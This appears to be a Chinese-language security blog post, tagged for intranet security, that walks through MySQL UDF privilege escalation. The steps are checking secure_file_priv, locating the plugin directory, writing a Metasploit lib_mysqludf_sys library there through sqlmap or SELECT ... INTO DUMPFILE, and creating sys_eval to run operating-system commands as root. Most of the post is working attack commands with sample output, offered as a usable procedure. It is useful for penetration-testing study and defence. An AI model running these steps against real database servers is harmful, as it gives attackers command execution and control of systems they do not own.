---
title: UDF 提权
published: 2025-03-09 16:40:49
tags: [内网安全,提权思路]
category: 安全
draft: false
---

# UDF 提权

> https://www.sqlsec.com/2020/11/mysql.html#CVE-2012-2122
> 

自定义函数，是数据库功能的一种扩展。用户通􏰁自定义函数可以实现在 MySQL 中无法方便实现的功能，其添加的新函数都可以在 SQL 语句中调用，就像调用本机函数 `version()`等方便

### 前提secure_file_priv需要等于空或者等于插件目录

```sql
SHOW VARIABLES LIKE "secure_file_priv";
```

### **动态链接库**

如果是 `MySQL >= 5.1` 的版本，必须把 UDF 的动态链接库文件放置于 MySQL 安装目录下的 lib\plugin 文件夹下文件夹下才能创建自定义函数

动态链接库可以在`metasploit`获取

```sql
MSF 根目录/embedded/framework/data/exploits/mysql
//
lib_mysqludf_sys_32.dll
lib_mysqludf_sys_32.so  
lib_mysqludf_sys_64.dll  
lib_mysqludf_sys_64.so
```

### 寻找插件目录

```sql
mysql> show variables like '%plugin%';
+---------------+-----------------------+
| Variable_name | Value                 |
+---------------+-----------------------+
| plugin_dir    | /usr/lib/mysql/plugin |
+---------------+-----------------------+
```

如果不存在的话可以在 `webshell`中找到 MySQL 的安装目录然后手工创建 `\lib\plugin` 文件夹

### 写入**动态链接库**

SQL 注入且是高权限，plugin 目录可写且需要 `secure_file_priv` 无限制，MySQL 插件目录可以被 MySQL 用户写入，这个时候就可以直接使用 sqlmap 来上传动态链接库

```sql
sqlmap -u "http://localhost:30008/" --data="id=1" --file-write="/Users/sec/Desktop/lib_mysqludf_sys_64.so" --file-dest="/usr/lib/mysql/plugin/udf.so"
```

不过一般都是手工写文件到 plugin 目录下的

```sql
# 直接 SELECT 查询十六进制写入
SELECT 0x7f454c4602... INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';

# 解码十六进制再写入多此一举
SELECT unhex('7f454c4602...') INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';
```

文件的16进制可以通过mysql自带的hex函数编码

```sql
# 直接传入路径编码
SELECT hex(load_file('/lib_mysqludf_sys_64.so'));

# 也可以将路径 hex 编码
SELECT hex(load_file(0x2f6c69625f6d7973716c7564665f7379735f36342e736f));
```

一般可以

```sql
mysql> use mysql;

mysql> create table foo(line blob);
Query OK, 0 rows affected (0.00 sec)

mysql> insert into foo values (load_file('/tmp/lib_mysqludf_sys_64.so'))
Query OK, 1 row affected (0.00 sec)

mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/udf.so';
Query OK, 1 row affected (0.00 sec)
```

## 创建函数

```sql
mysql> create function sys_eval returns string soname 'udf.so';
Query OK, 0 rows affected (0.00 sec)

mysql> select * from mysql.func; 
+----------+-----+--------+----------+
| name     | ret | dl     | type     |
+----------+-----+--------+----------+
| sys_eval |   2 | udf.so | function |
+----------+-----+--------+----------+

mysql> select sys_eval('whoami'); // 函数存在root函数
+--------------------+
| sys_eval('whoami') |
+--------------------+
| root               |
+--------------------+
```